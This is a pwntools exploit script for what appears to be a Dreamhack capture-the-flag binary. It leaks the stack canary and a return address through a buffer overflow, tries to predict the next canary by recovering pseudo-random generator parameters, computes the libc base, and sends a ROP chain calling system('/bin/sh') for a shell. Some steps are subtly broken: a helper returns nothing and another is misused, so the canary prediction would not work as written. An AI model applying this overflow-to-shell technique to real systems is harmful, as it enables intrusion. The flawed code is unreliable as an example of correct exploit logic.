from pwn import *

context.binary = elf = ELF('./prob')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('./libc.so.6')

HOST, PORT = 'host8.dreamhack.games 1234'.split()
MOD = 2 ** 32

def slog(n, a): return success(': '.join([n, hex(a)]))

if args.REMOTE:
    p = remote(HOST, PORT)
else: # elif
    p = remote('localhost', 80)
# else:
#     pass
    # 20.04 우분투 밖에 없는데 도커로 또 만들긴 뭐해 그냥 문제파일 쓰게 된...
    # p = process(env={"LD_PRELOAD":"./libc.so.6"})

# 0x100, buf + minary 초기화 후
# buf[0xf8], 근데 0x140만큼 받음
# minary < 0x8
# rbp
# ret

def send(pay):
    p.sendafter(b'Enter a string > ', pay)
    p.recvuntil(b'Your string: ')
    p.recvuntil(pay)

def prng(x, mul, inc):
    x = (x * mul + inc) & 0xFFFFFFFF

def minary(s0, s1, s2):
    a = (s1 - s0) & 0xffffffff
    b = (s2 - s1) & 0xffffffff
    if a % 2 == 0:
        return None  # inverse 없음, 다시 누출 필요
    inv = pow(a, -1, MOD)
    mul = (b * inv) & 0xffffffff
    inc = (s1 - mul * s0) & 0xffffffff
    return mul, inc

pay = b'A'*0xf8
send(pay)

cnry = u64(p.recv(8))
sfp = u64(b'\x00' * 2 + p.recv(6))
slog("cnry", cnry)
slog("sfp", sfp)

pay = b'A'*0xf8
send(pay)

cnry2 = u64(p.recv(8))
slog("cnry2", cnry2)

s0 = (cnry >> 32) & 0xFFFFFFFF
s1 = cnry & 0xFFFFFFFF

s2 = (cnry2 >> 32) & 0xFFFFFFFF
s3 = cnry2 & 0xFFFFFFFF

x = minary(s0, s1, s2)

mul, inc = x
s4 = minary(s3, mul, inc)
s5 = minary(s4, mul, inc)

pay = b'A'*0xf8 + p64(cnry) + b'A'*0x8 # ret
send(pay)
ret = u64(b'\x00'*2 + p.recv(6))
slog("ret", ret) # 

lb = ret + 0x24f000 # leaked output is pointing ->
# 프로세스 실행중에 입력해보고 확인한 결과, ret이 lb와 어느정도 차이 나는지 확인
'''
              Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x5afc6dc45000     0x5afc6dc46000 r--p     1000       0 prob
    0x5afc6dc46000     0x5afc6dc47000 r-xp     1000    1000 prob
    0x5afc6dc47000     0x5afc6dc48000 r--p     1000    2000 prob
    0x5afc6dc48000     0x5afc6dc49000 r--p     1000    2000 prob
    0x5afc6dc49000     0x5afc6dc4a000 rw-p     1000    3000 prob
    0x7a79a59da000     0x7a79a59dd000 rw-p     3000       0 [anon_7a79a59da]
    0x7a79a59dd000     0x7a79a5a05000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7a79a5a05000     0x7a79a5b8d000 r-xp   188000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7a79a5b8d000     0x7a79a5bdc000 r--p    4f000  1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7a79a5bdc000     0x7a79a5be0000 r--p     4000  1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7a79a5be0000     0x7a79a5be2000 rw-p     2000  202000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7a79a5be2000     0x7a79a5bef000 rw-p     d000       0 [anon_7a79a5be2]
    0x7a79a5bf2000     0x7a79a5bf4000 rw-p     2000       0 [anon_7a79a5bf2]
    0x7a79a5bf4000     0x7a79a5bf5000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7a79a5bf5000     0x7a79a5c20000 r-xp    2b000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7a79a5c20000     0x7a79a5c2a000 r--p     a000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7a79a5c2a000     0x7a79a5c2c000 r--p     2000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7a79a5c2c000     0x7a79a5c2e000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffe73313000     0x7ffe73334000 rw-p    21000       0 [stack]
    0x7ffe7335a000     0x7ffe7335e000 r--p     4000       0 [vvar]
    0x7ffe7335e000     0x7ffe73360000 r-xp     2000       0 [vdso]
'''
slog("libc_base", lb)

rop = ROP(libc)

system = lb + libc.sym['system']
pop_rdi = lb + rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = lb + next(libc.search(b'/bin/sh\x00'))
ret = lb + rop.find_gadget(['ret'])[0]

slog("system", system)
slog("binsh", binsh)

minary = (s4 << 32) | s5

pay = b'quit'
pay += b'A'*(0xf8 - len(pay))
pay += p64(minary)
pay += b'B'*0x8
pay += p64(pop_rdi) + p64(binsh)
pay += p64(system)

p.sendlineafter(b'Enter a string > ', pay)

p.interactive()